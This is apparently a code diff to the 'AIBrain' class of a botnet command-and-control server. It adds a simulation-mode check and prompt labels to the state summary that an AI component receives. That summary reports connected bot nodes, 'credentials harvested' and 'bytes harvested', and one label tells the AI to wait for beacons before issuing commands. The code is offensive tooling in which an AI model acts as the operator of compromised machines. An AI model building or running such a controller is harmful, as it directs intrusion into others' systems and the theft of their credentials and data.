@@ -161,6 +161,10 @@ class AIBrain:
         bytes_raw = await self.c2.redis.get("c2:bytes_harvested")
         bytes_harvested = int(bytes_raw) if bytes_raw else 0
 
+        # Check if simulation is active
+        sim_raw = await self.c2.redis.get("c2:simulation_enabled")
+        sim_active = sim_raw and sim_raw != "0"
+
         node_summary = []
         for n in active[:6]:
             node_summary.append(
@@ -185,8 +189,26 @@ class AIBrain:
 
         memory_summary = await self.memory.context_summary()
 
+        if sim_active:
+            data_label = (
+                "⚠️ SIMULATION MODE IS ACTIVE — ALL DATA BELOW IS MOCK/SIMULATED.\n"
+                "These are not real nodes. Do not treat these as live targets.\n"
+                "Credentials, events, nodes, and metrics are fabricated for testing.\n"
+                "When simulation is disabled, all this data will be purged.\n\n"
+            )
+        elif len(nodes) == 0:
+            data_label = (
+                "NO REAL NODES CONNECTED. The botnet has zero live agents.\n"
+                "There is no operational data to report. System is idle.\n"
+                "Wait for beacons to connect before issuing commands.\n\n"
+            )
+        else:
+            data_label = ""
+
         return (
+            f"{data_label}"
             f"CURRENT C2 STATE:\n"
+            f"- Simulation: {'⚠️ ACTIVE (MOCK DATA)' if sim_active else 'OFF (REAL DATA)'}\n"
             f"- Total nodes: {len(nodes)}, Active: {len(active)}\n"
             f"- Credentials harvested: {cred_count}\n"
             f"- Bytes harvested: {bytes_harvested} bytes\n"
